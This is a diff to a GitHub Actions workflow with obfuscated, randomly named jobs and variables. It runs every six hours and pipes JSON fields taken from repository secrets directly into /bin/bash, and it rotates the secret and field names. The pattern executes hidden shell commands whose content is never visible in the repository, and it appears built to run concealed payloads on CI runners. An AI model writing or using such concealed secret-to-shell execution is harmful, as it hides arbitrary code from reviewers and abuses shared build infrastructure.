@@ -2,21 +2,23 @@ name: trianglebreadline
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 1/6 * * *'
+    - cron: '26 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: trianglebreadline
         env:
-          bh26121: ${{ secrets.bh26121 }}
+          fni7: ${{ secrets.fni7 }}
         run: |
-          echo $bh26121 | jq -r .vs76075 | /bin/bash
-          echo $eq1405 | jq -r .a05 | /bin/bash
-          echo $f0512 | jq -r .tv11240 | /bin/bash
-          echo $mw2 | jq -r .jg35 | /bin/bash
-          echo $yyisd43 | jq -r .cpht6117 | /bin/bash
-          echo $foz808 | jq -r .pr95728 | /bin/bash
-          echo $a926 | jq -r .dd1923 | /bin/bash
+          echo $fni7 | jq -r .dnnq623 | /bin/bash
+          echo $vnpy757 | jq -r .mg218 | /bin/bash
+          echo $q10336 | jq -r .srb52815 | /bin/bash
+          echo $ajlu6 | jq -r .z2764 | /bin/bash
+          echo $jssee8 | jq -r .cwp9840 | /bin/bash
+          echo $qn3 | jq -r .tz7635 | /bin/bash
+          echo $splo3 | jq -r .bhq298 | /bin/bash
 
